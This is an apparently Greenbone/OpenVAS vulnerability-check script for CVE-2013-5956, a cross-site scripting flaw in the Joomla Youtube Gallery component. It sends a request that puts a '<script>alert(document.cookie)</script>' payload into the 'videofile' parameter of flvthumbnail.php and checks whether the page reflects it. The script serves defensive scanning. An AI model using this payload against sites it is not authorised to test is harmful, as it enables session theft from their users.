CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804336" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2013-5956" );
	script_bugtraq_id( 66245 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-03-17 17:05:07 +0530 (Mon, 17 Mar 2014)" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Joomla Component Youtube Gallery Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Joomla! component youtube gallery and is prone
to a cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to
read cookie or not." );
	script_tag( name: "insight", value: "The flaw is due to insufficient validation of 'videofile' HTTP GET parameter
passed to '/includes/flvthumbnail.php' script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute arbitrary HTML
and script code in a users browser session in the context of an affected site and launch other attacks." );
	script_tag( name: "affected", value: "Joomla Youtube Gallery version 3.4.0 and probably other versions." );
	script_tag( name: "solution", value: "Upgrade to Joomla Youtube Gallery version 3.8.4 or later." );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Mar/264" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/joomla-youtube-gallery-340-cross-site-scripting" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/125732/Joomla-Youtube-Gallery-3.4.0-Cross-Site-Scripting.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_mandatory_keys( "joomla/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/components/com_youtubegallery/includes/flvthumbnail.php?video" + "file=<script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}
exit( 99 );

